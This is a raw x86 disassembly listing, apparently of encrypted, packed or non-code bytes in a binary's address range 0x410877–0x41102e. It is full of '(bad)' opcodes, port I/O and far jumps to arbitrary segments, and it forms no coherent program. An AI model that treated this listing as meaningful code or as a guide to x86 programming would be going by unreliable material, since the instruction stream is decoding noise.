  410877:	xor    edi,DWORD PTR ds:0x389d848d
  41087d:	xor    eax,0x4da28d8b
  410882:	fcomp  st(4)
  410884:	les    ecx,FWORD PTR [eax-0x23]
  410887:	(bad)  
  410888:	cmp    DWORD PTR cs:[eax+0x41],edx
  41088c:	cs ret 
  41088e:	mov    ah,0x4d
  410890:	in     eax,0xc4
  410892:	in     eax,dx
  410893:	pushf  
  410894:	pop    ecx
  410895:	jle    0x4108e8
  410897:	lea    edx,[esi]
  410899:	gs cmp al,0x83
  41089c:	ins    BYTE PTR es:[edi],dx
  41089d:	mov    al,ds:0xb5f5abbe
  4108a2:	push   esp
  4108a3:	adc    eax,0xd2037c93
  4108a8:	cmc    
  4108a9:	mov    dh,0x1f
  4108ab:	sar    DWORD PTR [ebp+0x25],1
  4108ae:	adc    DWORD PTR [ebx],0xffffffbd
  4108b1:	out    0x0,al
  4108b3:	clc    
  4108b4:	xchg   esp,eax
  4108b5:	test   eax,0xb6b61341
  4108ba:	out    0x4a,eax
  4108bc:	cwde   
  4108bd:	cdq    
  4108be:	mov    ds:0x4d5138b6,al
  4108c3:	pop    eax
  4108c4:	clc    
  4108c5:	push   0xffffffc8
  4108c7:	sub    eax,0xbfc19842
  4108cc:	cs push edi
  4108ce:	or     al,0xba
  4108d0:	xor    eax,0x7b55b1ef
  4108d5:	in     al,0x45
  4108d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d8:	jle    0x4108b4
  4108da:	lahf   
  4108db:	mov    edx,0x82253d24
  4108e0:	or     DWORD PTR [ebp-0xb],edx
  4108e3:	fimul  WORD PTR [edi]
  4108e5:	(bad)  
  4108e6:	jnp    0x410906
  4108e8:	adc    ecx,DWORD PTR [ebp-0x189e5d48]
  4108ee:	push   edx
  4108ef:	jecxz  0x4108d8
  4108f1:	sbb    DWORD PTR [eax-0x16],eax
  4108f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108f5:	dec    ebp
  4108f6:	add    eax,0xebccc483
  4108fb:	pop    ebp
  4108fc:	dec    esi
  4108fd:	push   ebx
  4108fe:	inc    ecx
  4108ff:	mov    dh,al
  410901:	or     eax,0xeeeecc35
  410906:	sub    al,0x39
  410908:	inc    ecx
  41090a:	ret    
  41090b:	loope  0x41097f
  41090d:	or     al,0x77
  41090f:	aaa    
  410910:	jno    0x4108c6
  410912:	jno    0x4108db
  410914:	js     0x410935
  410916:	push   ss
  410917:	popf   
  410918:	outs   dx,BYTE PTR ds:[esi]
  410919:	sbb    BYTE PTR [eax-0x2c],0x78
  41091d:	add    al,0xbe
  41091f:	retf   0x3323
  410922:	outs   dx,BYTE PTR ds:[esi]
  410923:	push   cs
  410924:	xchg   ebp,eax
  410925:	cmp    eax,0x525b510d
  41092a:	jnp    0x41091c
  41092c:	mov    ah,0x7e
  41092e:	mov    WORD PTR [edi-0x7b309cde],?
  410934:	jb     0x41090b
  410936:	xchg   edi,eax
  410937:	out    0x57,eax
  410939:	pushf  
  41093a:	or     DWORD PTR [edx+edi*2-0x11],ebx
  41093e:	das    
  41093f:	xor    dh,BYTE PTR [esi]
  410941:	and    dl,cl
  410943:	jmp    0x86163361
  410948:	mov    ebx,0xdd764752
  41094d:	imul   esi,DWORD PTR [esi-0x71338206],0x72
  410954:	mov    ecx,cs
  410956:	fisub  DWORD PTR [ebp-0x27e35ad8]
  41095c:	aaa    
  41095d:	jnp    0x410984
  41095f:	sub    eax,0x30be867b
  410964:	push   DWORD PTR [ecx+0x49]
  410967:	xor    ebp,DWORD PTR [edx]
  410969:	imul   ebp,DWORD PTR [ebx-0x8],0xdc566cf4
  410970:	sti    
  410971:	popf   
  410972:	sub    al,0x25
  410974:	add    BYTE PTR [edx],0x35
  410977:	dec    edx
  410978:	in     eax,0xe3
  41097a:	sti    
  41097b:	jb     0x41092e
  41097d:	mov    ebp,0x8b57b2a0
  410982:	add    esi,DWORD PTR [edx-0x3f0ff032]
  410988:	pusha  
  410989:	add    al,0x30
  41098b:	sbb    eax,0x5f1ffe1a
  410990:	rcl    DWORD PTR [edi+0x2ae4413c],cl
  410996:	jmp    0xb490:0x26b45977
  41099d:	shl    ah,cl
  41099f:	and    BYTE PTR [ecx],al
  4109a1:	dec    esi
  4109a2:	icebp  
  4109a3:	xchg   edx,eax
  4109a4:	fld    QWORD PTR [edi]
  4109a6:	sbb    edx,edi
  4109a8:	aas    
  4109a9:	or     esi,DWORD PTR [edi+0x209e6e86]
  4109af:	xchg   esp,eax
  4109b0:	jge    0x41099c
  4109b2:	cmp    BYTE PTR [edx],ch
  4109b4:	push   es
  4109b5:	call   0xb020:0xe021267e
  4109bc:	mov    dl,0x1
  4109be:	add    BYTE PTR [esi],dl
  4109c0:	jle    0x4109ea
  4109c2:	test   eax,0x5d530daf
  4109c7:	and    ah,BYTE PTR [edx-0x69a95763]
  4109cd:	ror    DWORD PTR [ebx+0x35964418],0xb1
  4109d4:	mov    dl,dl
  4109d6:	or     eax,0x39947b26
  4109db:	cld    
  4109dc:	mov    bh,0xf7
  4109de:	add    BYTE PTR [ebp-0x42],0x9d
  4109e2:	xchg   DWORD PTR [ebx+ebx*2+0x6e0aa377],ebp
  4109e9:	add    ch,ch
  4109eb:	xor    DWORD PTR [esi+0x2f],eax
  4109ee:	fwait
  4109ef:	stos   DWORD PTR es:[edi],eax
  4109f0:	fxch   st(7)
  4109f2:	sahf   
  4109f3:	mov    bp,0xe63f
  4109f7:	xor    al,0xf4
  4109f9:	inc    esp
  4109fa:	enter  0x875e,0xbb
  4109fe:	pop    esi
  4109ff:	jnp    0x410a60
  410a01:	jb     0x410a1c
  410a03:	fcmovne st,st(0)
  410a05:	aad    0xad
  410a07:	aas    
  410a08:	cdq    
  410a09:	outs   dx,DWORD PTR ds:[esi]
  410a0a:	inc    ecx
  410a0b:	and    DWORD PTR [edx-0x14],0x4cc079e9
  410a12:	imul   eax,DWORD PTR [ebx-0x6adc8949],0xa409ca3e
  410a1c:	cmp    al,0x34
  410a1e:	mov    BYTE PTR [ebx],dl
  410a20:	add    esp,DWORD PTR [ebp+0x4576bd10]
  410a26:	mov    ah,0xa0
  410a28:	callw  0x4963
  410a2c:	(bad)  
  410a2d:	jns    0x4109f8
  410a2f:	sub    DWORD PTR [esi],0xa7b38603
  410a35:	rol    BYTE PTR [ecx],1
  410a37:	dec    esi
  410a38:	lods   al,BYTE PTR ds:[esi]
  410a39:	int3   
  410a3a:	mov    ecx,DWORD PTR [edi]
  410a3c:	out    dx,eax
  410a3d:	pop    es
  410a3e:	or     DWORD PTR [esi+eax*2],edi
  410a41:	je     0x4109eb
  410a43:	xor    BYTE PTR [edx+0xdf1095c],bl
  410a49:	mov    edi,0x5e2c4750
  410a4e:	mov    ah,BYTE PTR [edx+0x54]
  410a51:	not    BYTE PTR [ebp+esi*4+0x68]
  410a55:	cmp    ebp,edx
  410a57:	add    eax,eax
  410a59:	xor    dl,BYTE PTR [edi]
  410a5b:	lods   al,BYTE PTR ds:[esi]
  410a5c:	ror    BYTE PTR [ecx-0x68],1
  410a5f:	sbb    al,0x5d
  410a61:	data16 (bad) 
  410a63:	jmp    0x4109fd
  410a65:	push   0xfffffffe
  410a67:	mov    esi,0xff3ae38e
  410a6c:	mov    ds:0xd08e5c97,al
  410a71:	out    0x55,eax
  410a73:	push   0x4c8a683d
  410a78:	mov    ah,0x13
  410a7a:	clc    
  410a7b:	sbb    BYTE PTR [eax-0x1a],ch
  410a7e:	pop    edx
  410a7f:	lods   eax,DWORD PTR ds:[esi]
  410a80:	or     eax,0x7329bf80
  410a85:	clc    
  410a86:	retf   0x5c4a
  410a89:	push   ebp
  410a8a:	outs   dx,BYTE PTR ds:[esi]
  410a8b:	sbb    ch,BYTE PTR [edx]
  410a8d:	mov    cl,0x4d
  410a8f:	pusha  
  410a90:	dec    ebx
  410a91:	mov    ebx,0xe024e933
  410a96:	jne    0x410aba
  410a98:	(bad)
  410a9b:	in     eax,0x83
  410a9d:	aad    0x75
  410a9f:	repnz push cs
  410aa1:	push   cs
  410aa2:	ret    0x5ae3
  410aa5:	mov    ?,WORD PTR ds:0xfa5d9aaa
  410aab:	repz loope 0x410ab7
  410aae:	dec    eax
  410aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ab0:	mov    eax,0xcc1d6e06
  410ab5:	pop    ebp
  410ab6:	(bad)  
  410ab7:	mov    edx,0xdecf1450
  410abc:	mov    eax,ds:0xffd0a4de
  410ac1:	bound  ecx,QWORD PTR [esi+0x60]
  410ac4:	push   0xf4916513
  410ac9:	mov    ebx,0x39dea232
  410ace:	ins    BYTE PTR es:[edi],dx
  410acf:	sub    al,0x7d
  410ad1:	adc    ch,bh
  410ad3:	mov    al,0x74
  410ad5:	mov    dl,0x90
  410ad7:	ret    
  410ad8:	jmp    0x8b8e4f49
  410add:	add    esp,ebx
  410adf:	pop    edi
  410ae0:	lods   eax,DWORD PTR ds:[esi]
  410ae1:	pop    eax
  410ae2:	mov    BYTE PTR [ecx-0x14cb3fc],ah
  410ae8:	or     al,0x78
  410aea:	(bad)  
  410aeb:	mov    esi,0x20715ef6
  410af0:	call   0x34c0b0e9
  410af5:	sbb    dl,BYTE PTR [edx-0x5]
  410af8:	sub    DWORD PTR ss:[eax-0x14],ebp
  410afc:	stos   BYTE PTR es:[edi],al
  410afd:	push   ss
  410afe:	push   es
  410aff:	xchg   edx,eax
  410b00:	mov    bh,0xd7
  410b02:	xchg   BYTE PTR [ebx+0x1c597787],dh
  410b08:	mov    cl,BYTE PTR [ecx-0x424cb454]
  410b0e:	scas   al,BYTE PTR es:[edi]
  410b0f:	loop   0x410b87
  410b11:	add    eax,0x55b4242
  410b16:	adc    edi,DWORD PTR [bx+di+0x35b8]
  410b1b:	(bad)  
  410b1c:	popf   
  410b1d:	xchg   ebp,eax
  410b1e:	jmp    0x974598d4
  410b23:	icebp  
  410b24:	push   edi
  410b25:	in     al,0xcb
  410b27:	scas   al,BYTE PTR es:[edi]
  410b28:	push   ss
  410b29:	jmp    0x410b3c
  410b2b:	sub    esi,ebp
  410b2d:	add    dh,BYTE PTR [eax]
  410b2f:	or     ebx,DWORD PTR [ebp+0x32e47b45]
  410b35:	shl    DWORD PTR [eax],cl
  410b37:	mov    ch,0x3d
  410b39:	push   ss
  410b3a:	jle    0x410ba7
  410b3c:	sar    DWORD PTR [ecx+0x39],0x3f
  410b40:	std    
  410b41:	cmp    al,0xab
  410b43:	enter  0x3edd,0xeb
  410b47:	inc    eax
  410b48:	(bad)  
  410b4a:	loope  0x410b47
  410b4c:	mov    ds:0x7eb2a4be,eax
  410b51:	pop    ds
  410b52:	cmp    eax,0xcdc0cf37
  410b57:	std    
  410b58:	clc    
  410b59:	inc    edx
  410b5a:	cmp    esp,ecx
  410b5c:	push   ss
  410b5d:	cwde   
  410b5e:	cmp    DWORD PTR [ebp+0x5c0b4a2b],esi
  410b64:	and    BYTE PTR [edi-0x63dcc5e1],bh
  410b6a:	inc    esi
  410b6b:	les    esp,FWORD PTR [ebp-0x7b3136c5]
  410b71:	sub    al,0xb0
  410b73:	adc    al,0x95
  410b75:	xlat   BYTE PTR ds:[ebx]
  410b76:	add    eax,0x596c523f
  410b7b:	jecxz  0x410bc9
  410b7d:	pop    ecx
  410b7e:	neg    cl
  410b80:	fwait
  410b81:	hlt    
  410b82:	sbb    DWORD PTR [ebp+0x10c23506],ebx
  410b88:	mov    eax,ds:0xee0037bd
  410b8d:	test   eax,0x46d6c903
  410b92:	std    
  410b93:	bound  edx,QWORD PTR [ebx-0x6f]
  410b96:	in     eax,dx
  410b97:	rcl    DWORD PTR [ebx+0x5f],0x19
  410b9b:	es cmp al,dh
  410b9e:	xor    bl,BYTE PTR [ecx+edx*1]
  410ba1:	ins    DWORD PTR es:[edi],dx
  410ba2:	add    al,0xc8
  410ba4:	rol    BYTE PTR [ebp-0x3fabc501],0xe4
  410bab:	pop    eax
  410bac:	and    BYTE PTR [ecx],0x94
  410baf:	xchg   ebx,eax
  410bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bb2:	shr    BYTE PTR [ecx+0x27],cl
  410bb5:	shr    BYTE PTR [esi+0x50fe7ad7],1
  410bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bbc:	xchg   esp,eax
  410bbd:	inc    ebp
  410bbe:	mov    cl,0x96
  410bc0:	into   
  410bc1:	cli    
  410bc2:	sbb    eax,0x481cea0d
  410bc7:	jne    0x410c25
  410bc9:	or     al,0x80
  410bcb:	sub    cl,BYTE PTR [esi-0x12]
  410bce:	xor    ecx,ebp
  410bd0:	mov    cl,BYTE PTR [edi]
  410bd2:	jp     0x410c08
  410bd4:	mov    ebx,0x5540c8c5
  410bd9:	stos   BYTE PTR es:[edi],al
  410bda:	add    bl,BYTE PTR [ecx+0xb742002]
  410be0:	xchg   esi,eax
  410be1:	or     DWORD PTR ds:0x1ebffe05,esp
  410be7:	xor    eax,0xed30bd7d
  410bec:	pop    edi
  410bed:	cli    
  410bee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bef:	mov    ah,0x54
  410bf1:	pop    edi
  410bf2:	pop    ecx
  410bf3:	outs   dx,DWORD PTR ds:[esi]
  410bf4:	jbe    0x410c31
  410bf6:	cmp    al,0xc4
  410bf8:	mov    edi,0xa2428527
  410bfd:	fcomp  DWORD PTR [ecx+ebx*4+0x4f8d1659]
  410c04:	mov    bl,0xdb
  410c06:	cdq    
  410c07:	mov    ds:0x4d134f37,al
  410c0c:	mov    esp,0x553ea4ce
  410c11:	jo     0x410be9
  410c13:	(bad)  
  410c14:	repnz aaa 
  410c16:	inc    edi
  410c17:	fimul  WORD PTR [ecx+0x5d8e1a77]
  410c1d:	ds loope 0x410c99
  410c20:	xchg   ecx,eax
  410c21:	mov    ebx,ds
  410c23:	xor    eax,0x79fcf409
  410c28:	push   esp
  410c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c2a:	inc    ebx
  410c2b:	inc    esi
  410c2c:	nop
  410c2d:	in     eax,0xf2
  410c2f:	mov    esp,edi
  410c31:	mov    DWORD PTR [ebx+esi*4+0x355d9ce6],edi
  410c38:	addr16 push ebx
  410c3a:	outs   dx,DWORD PTR ds:[esi]
  410c3b:	je     0x410c64
  410c3d:	sbb    DWORD PTR [eax-0x76d9270d],0xffffff84
  410c44:	mov    dl,0x57
  410c46:	sbb    eax,0xaa2ebd31
  410c4b:	je     0x410c35
  410c4d:	xor    bh,dl
  410c4f:	imul   DWORD PTR [eax-0x11cdb8ad]
  410c55:	and    eax,0x66ebabc0
  410c5a:	sbb    ah,BYTE PTR ds:0x802731b
  410c60:	pop    es
  410c61:	xor    DWORD PTR gs:[eax],esp
  410c64:	jb     0x410c1b
  410c66:	retf   0xe8c1
  410c69:	cmp    ebx,DWORD PTR [ebp+0x8560db5]
  410c6f:	ror    ebp,0xad
  410c72:	fidiv  WORD PTR [esi]
  410c74:	(bad)  [edx]
  410c76:	fld    QWORD PTR [ebx]
  410c78:	repnz push edx
  410c7a:	out    0xf5,al
  410c7c:	sbb    DWORD PTR [edx],ebx
  410c7e:	push   0x7f70181
  410c83:	inc    eax
  410c84:	mov    eax,0x85a480a7
  410c89:	in     al,dx
  410c8a:	les    edi,FWORD PTR [ebp+eax*1+0x2b]
  410c8e:	fimul  DWORD PTR [edi]
  410c90:	pop    ss
  410c91:	sub    DWORD PTR [eax],esi
  410c93:	int3   
  410c94:	popa   
  410c95:	sti    
  410c96:	ret    0xa11b
  410c99:	or     DWORD PTR [ecx+0x12],edi
  410c9c:	mov    al,0x10
  410c9e:	fwait
  410c9f:	jbe    0x410c3f
  410ca1:	ins    DWORD PTR es:[edi],dx
  410ca2:	add    eax,0x9ec8665c
  410ca7:	pop    es
  410ca8:	dec    edx
  410ca9:	fld    QWORD PTR [esi-0x6c]
  410cac:	jl     0x410cae
  410cae:	dec    eax
  410caf:	push   0xc8822faf
  410cb4:	add    DWORD PTR [esi-0x2b],edx
  410cb7:	cli    
  410cb8:	out    dx,al
  410cb9:	scas   eax,DWORD PTR es:[edi]
  410cba:	pop    edi
  410cbb:	sub    DWORD PTR [eax+0x6e5d2fd9],esi
  410cc1:	push   ss
  410cc2:	out    dx,al
  410cc3:	pop    edi
  410cc4:	or     bl,BYTE PTR [edi]
  410cc6:	jo     0x410d44
  410cc8:	ret    0x7116
  410ccb:	xchg   esi,eax
  410ccc:	pop    ebx
  410ccd:	call   FWORD PTR [ecx]
  410ccf:	xor    BYTE PTR [ebx-0x3e],bh
  410cd2:	lods   eax,DWORD PTR ds:[esi]
  410cd3:	fdivr  DWORD PTR [edx]
  410cd5:	pop    edi
  410cd6:	push   eax
  410cd7:	mov    eax,fs
  410cd9:	xlat   BYTE PTR ds:[ebx]
  410cda:	je     0x410c84
  410cdc:	das    
  410cdd:	jmp    0x410c60
  410cdf:	fld    QWORD PTR [ecx-0x61ae82c9]
  410ce5:	(bad)  
  410ce6:	fs mov al,0x51
  410ce9:	add    ecx,esi
  410ceb:	outs   dx,BYTE PTR ds:[esi]
  410cec:	data16 mov al,ds:0x5ae8644
  410cf2:	ss cmp eax,ebp
  410cf5:	aaa    
  410cf6:	xchg   DWORD PTR [ebx+ecx*1],edi
  410cf9:	sahf   
  410cfa:	call   0xf907:0xa5730cc3
  410d01:	dec    edx
  410d02:	dec    edi
  410d03:	xor    cl,BYTE PTR [eax]
  410d05:	retf   
  410d06:	nop
  410d07:	cmp    BYTE PTR [eax],dh
  410d09:	sub    ah,BYTE PTR [ebx]
  410d0b:	adc    DWORD PTR [esi+0x3b],0x91248279
  410d12:	out    0xd5,eax
  410d14:	mov    eax,ds:0xe6cad534
  410d19:	stos   DWORD PTR es:[edi],eax
  410d1a:	xchg   BYTE PTR [ecx],dl
  410d1c:	lods   al,BYTE PTR ds:[esi]
  410d1d:	push   eax
  410d1e:	aam    0xa9
  410d20:	mov    bl,0x3b
  410d22:	daa    
  410d23:	push   0xffffffe0
  410d25:	outs   dx,DWORD PTR ds:[esi]
  410d26:	scas   eax,DWORD PTR es:[edi]
  410d27:	pop    eax
  410d28:	cmp    eax,0xc6742125
  410d2d:	add    al,BYTE PTR [esi+0x5ed267ba]
  410d33:	ret    
  410d34:	jbe    0x410cd8
  410d36:	pushf  
  410d37:	lds    edi,FWORD PTR [ebx-0x5713a52]
  410d3d:	adc    al,dl
  410d3f:	xchg   ebx,eax
  410d40:	pop    edx
  410d41:	lods   al,BYTE PTR ds:[esi]
  410d42:	add    bl,BYTE PTR [ebx]
  410d44:	inc    edx
  410d45:	leave  
  410d46:	cmovae edi,DWORD PTR [ebx]
  410d49:	cs test al,0x29
  410d4c:	loope  0x410dc8
  410d4e:	pop    ebx
  410d4f:	mov    edx,DWORD PTR [edi]
  410d51:	pushf  
  410d52:	lea    ecx,[eax-0x1]
  410d55:	pop    eax
  410d56:	scas   eax,DWORD PTR es:[edi]
  410d57:	jl     0x410ce5
  410d59:	dec    eax
  410d5a:	dec    edi
  410d5b:	mov    cl,0xb6
  410d5d:	ins    DWORD PTR es:[edi],dx
  410d5e:	mov    edi,0xe497d315
  410d63:	ss pusha 
  410d65:	push   edi
  410d66:	jns    0x410d7f
  410d68:	fist   WORD PTR [eax]
  410d6a:	cmp    DWORD PTR [ebp-0x6b302146],edi
  410d70:	arpl   WORD PTR [ecx+0x4],si
  410d73:	ins    DWORD PTR es:[edi],dx
  410d74:	(bad)  
  410d76:	jmp    0x358c6870
  410d7b:	jle    0x410dba
  410d7d:	mov    ah,0x33
  410d7f:	xchg   ebx,eax
  410d80:	adc    dh,bl
  410d82:	aas    
  410d83:	dec    ebx
  410d84:	retf   
  410d85:	add    ah,bl
  410d87:	sbb    al,0xf0
  410d89:	fist   DWORD PTR [esi+0xe3f9cef]
  410d8f:	and    DWORD PTR [ebp+0x28],0x4a4d06de
  410d96:	lahf   
  410d97:	out    dx,al
  410d98:	stc    
  410d99:	sub    eax,ebx
  410d9b:	add    eax,0xf6983a52
  410da0:	add    ecx,DWORD PTR [edi+0x30ebb88c]
  410da6:	push   ebx
  410da7:	popf   
  410da8:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410daa:	push   esp
  410dab:	xor    ah,cl
  410dad:	push   ebp
  410dae:	es sbb al,0x8c
  410db1:	mov    bl,0x92
  410db3:	mov    esp,0xedde5e04
  410db8:	clc    
  410db9:	nop
  410dba:	cdq    
  410dbb:	jns    0x410d5f
  410dbd:	aad    0x43
  410dbf:	loopne 0x410d90
  410dc1:	mov    bl,0x96
  410dc3:	leave  
  410dc4:	aad    0x18
  410dc6:	shr    BYTE PTR [eax],1
  410dc8:	mov    DWORD PTR [edi+0x1e],eax
  410dcb:	in     eax,dx
  410dcc:	jge    0x410d76
  410dce:	pop    esp
  410dcf:	ret    0x229
  410dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dd3:	xor    al,0xcd
  410dd5:	mov    esp,0x8c718f44
  410dda:	dec    edi
  410ddb:	jg     0x410dd7
  410ddd:	pop    ss
  410dde:	sbb    al,0xbd
  410de0:	pop    es
  410de1:	cmp    al,0x42
  410de3:	mov    edi,DWORD PTR ss:[edx-0x5c]
  410de7:	fwait
  410de8:	pop    esp
  410de9:	jle    0x410d79
  410deb:	(bad)  
  410dec:	and    DWORD PTR [ecx-0x4bcfdf05],edx
  410df2:	scas   al,BYTE PTR es:[edi]
  410df3:	popf   
  410df4:	outs   dx,DWORD PTR ds:[esi]
  410df5:	dec    esp
  410df6:	add    BYTE PTR [ebx],bl
  410df8:	pop    edx
  410df9:	je     0x410e4e
  410dfb:	loope  0x410df3
  410dfd:	pop    es
  410dfe:	in     eax,0x2e
  410e00:	push   ebx
  410e01:	mov    ah,0xf
  410e03:	jecxz  0x410e41
  410e05:	push   esp
  410e06:	mov    eax,0x3edb6885
  410e0b:	jmp    0xd1a3:0xab14d812
  410e12:	mov    ebp,0xe25fb3c0
  410e17:	push   ss
  410e18:	jecxz  0x410e8a
  410e1a:	mov    dh,0xbd
  410e1c:	(bad)  
  410e1d:	mov    edx,0xc229f205
  410e22:	stos   DWORD PTR es:[edi],eax
  410e23:	or     al,BYTE PTR [ecx]
  410e25:	add    bh,dl
  410e27:	mov    edx,0x74dd277c
  410e2c:	pushf  
  410e2d:	shl    BYTE PTR [eax+ecx*4+0xb],cl
  410e31:	sbb    BYTE PTR [ebp+edx*2-0x67],ah
  410e35:	push   eax
  410e36:	xor    BYTE PTR [edi+0x24fbc028],dh
  410e3c:	imul   eax,DWORD PTR [eax-0x52c6e1b1],0xffffff81
  410e43:	adc    DWORD PTR [ebx],esp
  410e45:	(bad)  
  410e47:	retf   0x8526
  410e4a:	or     esi,DWORD PTR [edi-0x2240b254]
  410e50:	mov    bl,0xac
  410e52:	mov    ch,0xb4
  410e54:	mov    edx,0x7aaebac5
  410e59:	mov    eax,0x53cd8784
  410e5e:	repz lahf 
  410e60:	pop    esp
  410e61:	in     eax,dx
  410e62:	fdivr  DWORD PTR [esi-0x342fdaa9]
  410e68:	pop    edx
  410e69:	les    edi,FWORD PTR [eax-0x1]
  410e6c:	nop    edi
  410e6f:	mov    WORD PTR [edi],ds
  410e71:	or     BYTE PTR [eax+0x15],bh
  410e74:	loopne 0x410e3c
  410e76:	dec    esi
  410e77:	cmp    ah,BYTE PTR [ebx+0x4d2d19f1]
  410e7d:	arpl   dx,ax
  410e7f:	sbb    ah,BYTE PTR [esi+0x7f]
  410e82:	push   esi
  410e83:	sbb    al,0xd6
  410e85:	cmp    eax,0xe355b171
  410e8a:	mov    edi,0x8dc513b8
  410e8f:	xor    BYTE PTR [edi],0x38
  410e92:	hlt    
  410e93:	xor    BYTE PTR [edi],ah
  410e95:	sub    eax,0x2155d350
  410e9a:	xchg   edi,eax
  410e9b:	xor    al,0x26
  410e9d:	into   
  410e9e:	or     ch,bl
  410ea0:	adc    edi,edi
  410ea2:	aaa    
  410ea3:	mov    edx,0x4f147cad
  410ea8:	sar    al,1
  410eaa:	dec    esi
  410eab:	(bad)  
  410eac:	mov    eax,0x8271adfb
  410eb1:	pushf  
  410eb2:	dec    ebx
  410eb3:	clc    
  410eb4:	xor    eax,0x8f37268d
  410eb9:	dec    ebx
  410eba:	in     eax,dx
  410ebb:	push   es
  410ebc:	pop    edx
  410ebd:	loope  0x410ed9
  410ebf:	mov    ecx,0x9028e026
  410ec4:	cli    
  410ec5:	mov    ds:0xba75d47d,al
  410eca:	ret    0x71f4
  410ecd:	inc    edi
  410ece:	mov    edi,0xc1506e3b
  410ed3:	ins    DWORD PTR es:[edi],dx
  410ed4:	cmp    BYTE PTR [edi+0x73269bf2],ah
  410eda:	push   ecx
  410edb:	mov    eax,0x9cfc36fd
  410ee0:	icebp  
  410ee1:	add    ah,BYTE PTR [ecx]
  410ee3:	repz push ecx
  410ee5:	les    eax,FWORD PTR [eax-0x1b]
  410ee8:	or     esp,ebx
  410eea:	inc    eax
  410eeb:	div    DWORD PTR [esi]
  410eed:	mov    al,0xda
  410eef:	icebp  
  410ef0:	jbe    0x410f4e
  410ef2:	xchg   edi,eax
  410ef3:	lock pop ecx
  410ef5:	or     eax,0x357a3a53
  410efa:	jp     0x410f64
  410efc:	adc    al,0xfc
  410efe:	inc    esp
  410eff:	pushf  
  410f00:	pusha  
  410f01:	retf   
  410f02:	sbb    al,0x1
  410f04:	mov    al,0x16
  410f06:	sub    dh,BYTE PTR [ecx-0x3b8fb3f9]
  410f0c:	js     0x410edb
  410f0e:	out    dx,eax
  410f0f:	mov    edi,0x5d0536d0
  410f14:	out    0xfb,eax
  410f16:	sbb    eax,0x3173114f
  410f1b:	inc    edi
  410f1c:	clc    
  410f1d:	xor    BYTE PTR [ebp-0x75],0xec
  410f21:	push   es
  410f22:	arpl   WORD PTR [eax],dx
  410f24:	xor    eax,DWORD PTR [ebx-0x24]
  410f27:	pusha  
  410f28:	or     DWORD PTR [edi],ebx
  410f2a:	clc    
  410f2b:	or     ebx,DWORD PTR [ebp+edi*2+0x24]
  410f2f:	retf   0x8e99
  410f32:	mov    esp,0x8d24f323
  410f37:	(bad)  
  410f39:	jmp    0xc3d2:0xce5f5b7f
  410f40:	in     al,0xa1
  410f42:	xchg   ebx,eax
  410f43:	pop    es
  410f44:	cmp    BYTE PTR [edx-0x77],al
  410f47:	pop    ecx
  410f48:	in     eax,dx
  410f49:	mov    edx,0x8e89bf7e
  410f4e:	fldcw  WORD PTR [esi+0x1]
  410f51:	cli    
  410f52:	pop    ebp
  410f53:	push   ebx
  410f54:	out    dx,al
  410f55:	loopne 0x410f5a
  410f57:	int3   
  410f58:	push   eax
  410f59:	mov    es,edi
  410f5b:	push   edi
  410f5c:	ror    BYTE PTR [ecx-0x141710c4],0x6c
  410f63:	xchg   esi,eax
  410f64:	ret    0x2ed7
  410f67:	ror    DWORD PTR [ecx+ecx*4+0x5aca26d0],0xa5
  410f6f:	mov    ebp,0xef018891
  410f74:	ror    BYTE PTR [eax-0x2ce9484a],0x4e
  410f7b:	fbld   TBYTE PTR [edx+eax*1+0x37]
  410f7f:	xchg   esp,eax
  410f80:	and    dh,BYTE PTR [ecx+0x3d]
  410f83:	push   edi
  410f84:	pop    edx
  410f85:	inc    edx
  410f86:	push   edx
  410f87:	pop    ebx
  410f88:	retf   0x6429
  410f8b:	sahf   
  410f8c:	rcl    DWORD PTR ds:0x618d00a2,1
  410f92:	aas    
  410f93:	ins    BYTE PTR es:[edi],dx
  410f94:	push   ebp
  410f95:	cdq    
  410f96:	enter  0x8b4f,0x6c
  410f9a:	mov    ch,0x2b
  410f9c:	mov    DWORD PTR [eax+0x14],0x59f9df0d
  410fa3:	stos   BYTE PTR es:[edi],al
  410fa4:	dec    eax
  410fa5:	xor    edx,edi
  410fa7:	mov    ecx,0x3c31a66e
  410fac:	mov    ds:0xa14b2ca6,al
  410fb1:	jecxz  0x411023
  410fb3:	push   ds
  410fb4:	sbb    al,0x1c
  410fb6:	ficomp WORD PTR [edx]
  410fb8:	mov    ds:0x18a6287e,al
  410fbd:	add    eax,0x9dd794d
  410fc2:	jl     0x411014
  410fc4:	adc    ch,BYTE PTR [ebp+0x69b4f4a]
  410fca:	mov    ds:0x37f1d6a9,eax
  410fcf:	in     eax,0xf0
  410fd1:	cmc    
  410fd2:	in     al,0xa0
  410fd4:	ror    DWORD PTR [edx],0xa
  410fd7:	imul   ecx,DWORD PTR [esi-0x276352ae],0x82f76ee2
  410fe1:	mov    es,WORD PTR [ebp-0x74]
  410fe4:	ins    BYTE PTR es:[edi],dx
  410fe5:	pop    ecx
  410fe6:	add    bh,BYTE PTR [ebx-0x26]
  410fe9:	ret    
  410fea:	jae    0x411030
  410fec:	adc    al,0x82
  410fee:	leave  
  410fef:	and    DWORD PTR [edi-0x75c523c9],edx
  410ff5:	add    BYTE PTR [ebx-0x22],0xdf
  410ff9:	pop    esp
  410ffa:	hlt    
  410ffb:	shl    DWORD PTR [edi-0x2f],0x4d
  410fff:	jo     0x410f9d
  411001:	inc    edi
  411002:	sub    BYTE PTR ds:0x1416e3e,ah
  411008:	test   al,0xe9
  41100a:	sub    BYTE PTR [edx],dh
  41100c:	leave  
  41100d:	mov    eax,ds:0x8b1c6f36
  411012:	cld    
  411013:	dec    esi
  411014:	add    DWORD PTR [ecx],0x6737c2ab
  41101a:	push   ebp
  41101b:	fadd   DWORD PTR [edi+eax*1-0x2e]
  41101f:	outs   dx,DWORD PTR ds:[esi]
  411020:	mov    ebp,0x782e6876
  411025:	dec    ebx
  411026:	test   DWORD PTR [ebx+0x3f],ecx
  411029:	fnstsw WORD PTR [ebx]
  41102b:	jne    0x410fd0
  41102d:	pop    ds
  41102e:	xchg   DWORD PTR [edx],eax
